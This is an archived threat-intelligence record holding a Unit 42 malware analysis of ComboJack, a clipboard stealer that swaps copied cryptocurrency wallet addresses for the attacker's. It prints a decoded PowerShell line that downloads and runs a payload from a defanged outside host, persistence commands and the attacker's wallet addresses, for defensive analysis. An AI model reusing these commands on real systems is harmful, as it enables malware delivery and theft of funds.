{
    "id": "3143b493-09c8-4e2f-a149-7a2912d214c4",
    "created_at": "2022-10-25T16:48:24.035765Z",
    "updated_at": "2025-03-27T02:06:06.744206Z",
    "deleted_at": null,
    "sha1_hash": "991be81293e8d94a7cd79741bf18005158ff319b",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-03-10T02:10:16Z",
    "file_modification_date": "2018-03-10T02:10:16Z",
    "file_size": 596797,
    "plain_text": "[Blog Home (https://researchcenter.paloaltonetworks.com/) > Unit 42 (https://researchcenter.paloaltonetworks.com/unit42/) > Sure, I’ll take that!](https://researchcenter.paloaltonetworks.com/)\nNew ComboJack Malware Alters Clipboards to Steal Cryptocurrency\n# Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency\n\n[By Brandon Levene (https://researchcenter.paloaltonetworks.com/author/brandon-levene/) and Josh Grunzweig (https://researchcenter.paloaltonetworks.com/aut](https://researchcenter.paloaltonetworks.com/author/brandon-levene/)\nMarch 5, 2018 at 5:00 AM\n[Category: Unit 42 (https://researchcenter.paloaltonetworks.com/unit42/)](https://researchcenter.paloaltonetworks.com/unit42/)\n[Tags: ComboJack (https://researchcenter.paloaltonetworks.com/tag/combojack/), Cryptocurrency (https://researchcenter.paloaltonetworks.com/tag/cryptocurren](https://researchcenter.paloaltonetworks.com/tag/combojack/)\n[(https://researchcenter.paloaltonetworks.com/tag/cryptoshuffler/), CVE-2017-8579 (https://researchcenter.paloaltonetworks.com/tag/cve-2017-8579/), malware](https://researchcenter.paloaltonetworks.com/tag/cve-2017-8579/)\n(https://researchcenter.paloaltonetworks.com/tag/malware/)\n\n 6,999 (6)\n\n(https://twitter.com/home?status=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F03%2Funit42-sure-ill-take-newalters-clipboards-steal-cryptocurrency%2F+Sure%2C+I%E2%80%99ll+take+that%21+New+ComboJack+Malware+Alters+Clipboards+to+S\n\n####  [ (https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F03%2Funit42-]\ncombojack-malware-alters-clipboards-steal-cryptocurrency%2F)  (https://www.linkedin.com/shareArticle?\n[mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F03%2Funit42-sure-ill-take-new-combojack-malware-alt](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F03%2Funit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency%2F&title=Sure%2C+I%E2%80%99ll+take+that%21+New+ComboJack+Malware+Alters+Clipboards+to+Steal+Cryptocurrency&summary=&source=)\ncryptocurrency%2F&title=Sure%2C+I%E2%80%99ll+take+that%21+New+ComboJack+Malware+Alters+Clipboards+to+Steal+Cryptocurren\n\n[(//www.reddit.com/submit)](https://www.reddit.com/submit)\n\n### Summary\n\nUnit 42 researchers have discovered a new currency stealer which targets cryptocurrencies and online wallets. “CryptoJack” functions by\nreplacing clipboard addresses with an attacker-controlled address which sends funds into the attacker’s wallet. This technique relies on victims not\nchecking the destination wallet prior to finalizing a transaction. In 2017, CryptoShuffler was the first malware to utilize this tactic. In contrast to that\none, which focused on numerous cryptocurrencies, ComboJack targets both a range of cryptocurrencies, as well as digital currencies such as\nWebMoney and Yandex Money.\n\n### Details\n\n[Early on the morning of February 25, 2018, Unit 42 and Proofpoint (https://www.proofpoint.com/us) researchers observed an interesting malspam](https://www.proofpoint.com/us)\ncampaign targeting Japanese and American users. This particular campaign tried to entice users by claiming a passport was lost and that the\nattached PDF contained a scanned copy of the document.\n\n_Image 1. Example malspam recieved by users._\n\nUsers opening this PDF would find a single line of text which refers to an embedded doc file.\n\n\n-----\n\n[Similar to techniques utilized by Dridex and Locky in mid-2017 (https://www.fireeye.com/blog/threat-research/2017/05/dridex_and_lockyret.html),](https://www.fireeye.com/blog/threat-research/2017/05/dridex_and_lockyret.html)\nthe PDF contained an embedded RTF file which contains an embedded remote object that attacks CVE-2017-8579\n(https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8579) as discussed in this FireEye report\n(https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html).\n\nThis embedded remote object is an HTA file which was located at hXXps://a.doko[.]moe/tnejln which contains encoded PowerShell\ncommands.\n\n(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/03/ComboJackImage2.png)\n\n_Image 2. Contents of the HTA file retrieved from hXXps://a.doko[.]moe/tnejln_\n\nDecoding the contents of the HTA file yields the following PowerShell command which downloads and executes a file:\n\n\n1\n2\n\n\nwscript.shell%systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe (new-object system.net.webclient).downloadfile(\nhXXp://masolo[.]win/protect/achi.exe $env:appdata\\bstest.exe) ; start $env:appdata\\bstest.exe\n\n\nThe full flow of execution may be visualized as follows:\n\n_Figure 2 Flow of execution leading to ComboJack being installed on victim_\n\nThat leads us to the payload, which we have dubbed ComboJack because of how it attempts to hijack a combination of digital currencies.\n\n### ComboJack\n\nThe following files were used for this analysis, which are explained below.\n\n**Initial File SHA256** 9613aefc12880528040812b0ce9d3827d1c25fe66f8598eaef82c169e8ed02da\n\n**Second Stage** cab010b59cf9d649106477df012ca49f939aa537910b56bfadbe1381b0484d88\n**SHA256**\n\n**Final Payload** 05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136\n**SHA256**\n\nThe initially downloaded file is a self-extracting executable (SFX) with embedded commands for extracting the second stage. This second stage is\na password protected SFX, however, the password is supplied by the first stage. This allows us to easily recover the contents of the second stage.\nHelpfully, the “setup.txt” from the first stage contains the following:\n\n|Initial File SHA256|9613aefc12880528040812b0ce9d3827d1c25fe66f8598eaef82c169e8ed02da|\n|---|---|\n|Second Stage SHA256|cab010b59cf9d649106477df012ca49f939aa537910b56bfadbe1381b0484d88|\n|Final Payload SHA256|05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136|\n\n\n-----\n\n_Image 3. Contents of setup.txt embedded in the first SFX layer of the payload._\n\nOnce the second stage is extracted and run, we are presented with the final stage of this attack, which we refer to as ComboJack. Once\nComboJack is extracted it begins by copying itself to the following location:\n\n\n1 C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\n\n\nIt then uses the built-in Windows tool, attrib.exe (used for setting file attributes), to set both hidden and system attributes to itself. This hides the\nfile from the user and allows it to execute with SYSTEM level privileges.\n\n\n1 \"cmd /k attrib +s +h \\\"C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\\\"\"\n\n\nFinally, the payload sets the following registry key to ensure persistence:\n\n\n1 HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\NVIDIA – C:\\ ProgramData\\NVIDIA\\NVDisplay.Container.exe\n\n\nWhen the above steps are completed, ComboJack enters into an infinite loop. Every half second it checks the contents of the clipboard. The\ncontents of the clipboard are checked for various criteria to determine if the victim has copied wallet information for various digital currencies. In\nthe event a wallet of interest is discovered, ComboJack will replace it with a hardcoded wallet that the attacker presumably owns in an attempt to\nhave the victim accidentally send money to the wrong location. This tactic relies on the fact that wallet addresses are typically long and complex\nand to prevent errors, most users will opt to copy an exact string in order to prevent potential errors. If any potential currency addresses are found,\nthey are replaced following the criteria in the table below:\n\n|Checks for this criteria|Replaces with|Wallet Type|\n|---|---|---|\n|Length of 42 and starts with a ‘0’|0xE44598AB74425450692F7b3a9f898119968da8Ad|Ethereum|\n|Length of 106 and starts with ‘4’|4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBE|Monero. It’s important to note that this replacement string is not long enough, as Monero wallet addresses are either 95 or 106 characters in length. This was likely a mistake made by the author.|\n|Length of 34 and starts with ‘1’|1LGskAycxvcgh6iAoigcvbwTtFjSfdod2x|Bitcoin|\n|Length of 34 and starts with ‘L’|LYB56d6TeMg6VmahcgfTZSALAQRcNRQUV|Litecoin|\n|Length of 11 and starts with ‘8’|79965017478|Qiwi|\n|Length of 13 and starts with ‘R’|R064565691369|WebMoney (Rubles)|\n|Length of 13 and starts with ‘Z’|Z152913748562|WebMoney (USD)|\n|Length of 13 and starts with ‘E’|88888888888888888888888888888888888888888888888888|Unknown|\n\n\n-----\n\na d s a s\n‘4100’\n\n_Table 1. Replacement address lookup table hardcoded into ComboJack._\n\nComboJack shares some similarities in basic functionality with CryptoShuffler (https://www.kaspersky.com/blog/cryptoshuffler-bitcoinstealer/19976/), which is a malware family discovered by Kaspersky in 2017. However whereas CryptoShuffler focused exclusively on\ncryptocurrencies, ComboJack also targets popular digital payment systems, such as WebMoney (USD, EUR, and RUB), and Yandex Money.\n\n### Conclusion\n\nWith the proliferation of Cryptomining malware, it is curious to see some actors take a different route to acquiring web-based currency.\nCryptoshuffler in 2017 may have been only the beginning of simple, yet effective clipboard stealers like ComboJack. By targeting multiple\ncryptocurrencies and web based wallets, the author of ComboJack appears to be hedging his or her bets on which currency will boom and which\nwill bust. As the prices of cryptocurrencies continue to rise it is likely we will see more and more malware targeting cryptocurrencies, as it presents\nthe fastest way to the highest profit.\n\nPalo Alto Networks WildFire customers are protected from this threat through the following ways:\n\nComboJack malware is identified as malicious and blocked via the Traps and WildFire products\n[Customers may monitor and track ComboJack (https://autofocus.paloaltonetworks.com/#/tag/Unit42.ComboJack) through the AutoFocus](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ComboJack)\ntag\n\n### IOCs\n\n**Lure PDFs:**\n\ndd8ba88df50de86e7bb9b6343313e48e1e3b8d1a84ffca0a06a203a2f027cfdc\n\nd3a5313a0070b8400b0d661f2515a0eb83e4e6110b98e9ffb6618e457bf52714\n\n15e6984beea04bf2f26fbbe1e490c59d1f51ba7ad0dce3ac76cea21579ca694b\n\n325fd50143d6d975d9db18cf9a069c9107c3bfcad5a07653d53c0fc315ee27ab\n\n**Payload:**\n\nbd1b56b6814aae369b0593dfe71450e1b45cb288f752faa2622d1b189bc6b2d6\n\n228e8b728f7b714934f5ecfa6fd5de256d1d24f634a63f2fc4663c7cfb3b9d65\n\n05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136\n\nd92b4c622d3524f6d5ce8fe53d802c6a0c51fd1f56ac2b554daac24d7b4fb8ef\n\n4d96d8cfefd9cc3f86bd3ab7f054f0b0acef726a4c349359bf44d22952b4744d\n\n85c27addbf3a7234ac1e2922002fdef216994708bdda28f2ad6d3a7a1b32934e\n\nea5eb17c32767486c1b3a8ee7a8eacefab125c93414cdea97348c2ee96752f7e\n\na6807cf5ed53b34cc9513defcde56c8a956c3d574ee9f300b3a763a7c8287081\n\n8d8f497313ed797090ef552d44198f8c21f0a6ed261b30902d4d37478cd2efeb\n\n47f14c24212c32e686f0b9162530c4b966c9cff907e1920c096ad81d078f20cd\n\n05cbc6b1e98bc6f8935f95454ba214cccaf3a36c497126512669daba59a407a0\n\n8a6f75a4a58bdafed085fd640681a4c94eee54f1bfb6e5eb6dcf8eb7524d2a2e\n\n2ee9a1c554a774925f83428a0822b901d7b3ed81c247cb0d038ecc188d9f9149\n\nd0f6dcdb4f749490a7ef678e9006474c885fbb3d8e396a5c8f2150441bb34782\n\na10a5666ce31c7a3de760f33d93bd924354e7bac1f07bde9e3ac3da8e250eb6d\n\n98e896586ea71f80a2b0024ec86133bfa5163f01f4faa1b1f380f0a2ea128c2f\n\nf9bff08960484d5c97f075090b9843dc1d54839a4dabc514e8f97f809e1ceaf5\n\nc1cc9448ee5684698f7891911821a9eb86f56be8852adef613b2fab4636e7b36\n\nece82af6fa1e94904d62e86fe86810fe85b058e56a311ca24ac7667409cff8c0\n\n##### Got something to say?\n\n\nLeave a comment...\n\n\n-----\n\n**Notify me of followup comments via e-mail**\n\n\nName (required)\n\n\nEmail (required)\n\n\nWebsite\n\n\nSUBMIT\n\n**SUBSCRIBE TO NEWSLETTERS**\n\nEmail\n\n**COMPANY**\n\n[Company (https://www.paloaltonetworks.com/company)](https://www.paloaltonetworks.com/company)\n\n[Careers (https://www.paloaltonetworks.com/company/careers)](https://www.paloaltonetworks.com/company/careers)\n\n[Sitemap (https://www.paloaltonetworks.com/sitemap)](https://www.paloaltonetworks.com/sitemap)\n\n[Report a Vulnerability (https://www.paloaltonetworks.com/security-disclosure)](https://www.paloaltonetworks.com/security-disclosure)\n\n**LEGAL NOTICES**\n\n[Privacy Policy (https://www.paloaltonetworks.com/legal-notices/privacy)](https://www.paloaltonetworks.com/legal-notices/privacy)\n\n[Terms of Use (https://www.paloaltonetworks.com/legal-notices/terms-of-use)](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n**ACCOUNT**\n\n[Manage Subscription (https://www.paloaltonetworks.com/company/subscriptions)](https://www.paloaltonetworks.com/company/subscriptions)\n\n##  (https://www.linkedin.com/company/palo-alto-networks)   (https://www.facebook.com/PaloAltoNetworks/)   (https://twitter.com/PaloAltoNtwks)\n\n(https://ignite.paloaltonetworks.com/usa/?\n\nCampaignId=7010g000001IH8U&utm_content=Ignite18USA&utm_medium=390x90banner&utm_source=website)\n\n© 2016 Palo Alto Networks, Inc. All rights reserved.\n\n\nSALES > 866.320.4788 \n\n\nSEE A DEMO \n\n\n[TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD)](http://connect.paloaltonetworks.com/virtual-utd)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.03.05.New_ComboJack_Malware/New_ComboJack_Steal_Cryptocurrency.pdf"
    ],
    "report_names": [
        "New_ComboJack_Steal_Cryptocurrency"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041166,
    "ts_creation_date": 1520647816,
    "ts_modification_date": 1520647816,
    "files": {
        "pdf": "https://archive.orkl.eu/991be81293e8d94a7cd79741bf18005158ff319b.pdf",
        "text": "https://archive.orkl.eu/991be81293e8d94a7cd79741bf18005158ff319b.txt",
        "img": "https://archive.orkl.eu/991be81293e8d94a7cd79741bf18005158ff319b.jpg"
    }
}